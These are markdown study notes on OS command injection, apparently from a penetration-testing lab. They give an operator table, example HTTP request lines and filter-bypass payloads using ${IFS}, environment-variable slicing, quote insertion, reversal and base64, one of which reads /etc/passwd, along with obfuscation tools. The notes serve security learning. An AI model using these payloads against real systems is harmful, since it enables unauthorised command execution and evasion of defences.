# Logic flow
1)Test all available functions and grab all requests in Burpsuite
2)Test for all blacklisted operators(check the operators.txt file) 
```
ex: GET /index.php?to=tmp&from=696212415.txt&finish=1&move=1 HTTP/1.1
Start with (;): GET /index.php?to=tmp%3b&from=696212415.txt&finish=1&move=1 HTTP/1.1
```
```
Then (\n): GET /index.php?to=tmp%oa%3b&from=696212415.txt&finish=1&move=1 HTTP/1.1
...ETC
```
3)When you find the operator that is not blacklisted engage all the tips and trick to bypass Slashes, Semi-columns, 
command bypass with Apostrophes or base64 encoding
4)Enjoy

# Operators
```
Injection Operator 		Injection Character 	URL-Encoded 	Executed Command
Semicolon 				; 						%3b 			Both
New Line 				\n 						%0a 			Both
Background 				& 						%26 			Both (second output generally shown first)
Pipe 					| 						%7c 			Both (only second output is shown)
AND 					&& 						%26%26 			Both (only if first succeeds)
OR 						|| 						%7c%7c 			Second (only if first fails)
Sub-Shell 				`` 						%60%60 			Both (Linux-only)
Sub-Shell 				$() 					%24%28%29 		Both (Linux-only)


Injection Type 								Operators
SQL Injection 								' , ; -- /* */
Command Injection 							; &&
LDAP Injection 								* ( ) & |
XPath Injection 							' or and not substring concat count
OS Command Injection 						; & |
Code Injection 								' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal 	../ ..\\ %00
Object Injection 							; & |
XQuery Injection 							' ; -- /* */
Shellcode Injection 						\x \u %u %n
Header Injection 							\n \r\n \t %0d %0a %09
```
OBS:  `double back ticks () or with a sub-shell operator ($()) will only work on Unix/Linux envs and not Windows.`


# Useful Bypasses
### Frontend Bypass
Fronted bypass happens when User input controls are controlled only on the fronted and not on the back-end server.
This means that no reload or packages are sent to the back-end that's how we know it!
**To Bypass:**
Fetch the request in Burp
Send it thru Repeater
Play around by injecting command URL encoded

### Bypass Blacklisted operators
New line or \n might be a good point where to start since is rarely blocked and sometimes is part of the script itself.
```
127.0.0.1\n  
```

### Bypass Blacklisted Spaces
```
Tabs (%09):
ex: 127.0.0.1%0a%09

IFS ( ${IFS} ): 
```
Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments
`ex: 127.0.0.1%0a${IFS}`
```
Bash Brace Expansion ( {ls,-la} ):
ex: 127.0.0.1%0a{ls,-la}

ex: you can contactenate more 127.0.0.1%0a{ls,-la,${PATH:0:1}home} (this if / is blacklisted)
```

### Bypass Slashes and back Slashes
Sometimes **"/"** and **"\"** can be blacklisted so following you will find some creative way on how to bypass that.
**Bypass win ENV varables(Linux ONLY)**
If we run:
```
echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games
```
Then can we extract slashes from it and use it together with echo(start point, how many chars to extract):
```
echo ${PATH:0:1}
/
```
**Bypass win ENV varables(Windows ONLY)**
```
$env:HOMEPATH[0]
```

### Bypass Semi-columns
**Bypass win ENV varables(Linux ONLY)**
If we run:
```
echo ${LS_COLORS:10:1}
;
```
The we can extract the ; and join it to another command:
```
ex: 127.0.0.1${LS_COLORS:10:1}${IFS}
```

### Bypass Blacklisted commands
Sometimes in more advanced cases some commands may be totally blacklisted ex whoami, pwd etc
**Bypass Linux + Windows** 
You can archive by single-quote ' and a double-quote ", but they have to be even otherwise is just a string.
```
ex: w'h'o'am'i  or w"h"o"am"i
ex: 127.0.0.1%0aw'h'o'am'i
```
**Bypass Linux ONLY**	
You may archive by backslash \ and positional parameter character $@
```
ex: who$@ami
w\ho\am\i
```
**Bypass Windows ONLY**
```
who^ami
```


# Case Manipulations
Is when the application ex blacklist a command whoami but WhoAMi is not same command and may work on Windows 
ex where commands are not case sensitive but are on Linux instead.

### Case manipulation on Windows
```
WhOaMi
```
(This will work out of the box cause windows is case insensitive)

### Case manipulation on Linux
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
(This will convert all to lowercase since Linux is Case sensitive)
P.S: remember to convert spaces with TAB ex: 1`27.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")`
```
or you can use this which does same: 
$(a="WhOaMi";printf %s "${a,,}")
```

### Case manipulation with reverse commands(Linux ONLY)
```
echo 'whoami' | rev
imaohw
Then re-reverse it: $(rev<<<'imaohw')
```

### Case manipulation with reverse commands(Windows ONLY)
```
"whoami"[-1..-20] -join ''
imaohw
Then re-reverse it: iex "$('imaohw'[-1..-20] -join '')"
```

### Case manipulation with Base64 Encoding (Linux ONLY)
```
echo -n 'cat /etc/passwd | grep 33' | base64

Then decode it: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
(<<< is an alternative to `| if is blacklisted)
```

### Case manipulation with Base64 Encoding (Windows ONLY)
```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA
The decode it: iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```


# Obfuscation Tools
If the application is using heavy filtering you may want to engage harder and following some useful tools you may want to check.
### Linux
```
git clone https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
or make it shorter:
```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```
Then decode it: `bash -c "payload here"`

### Windows
```
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
```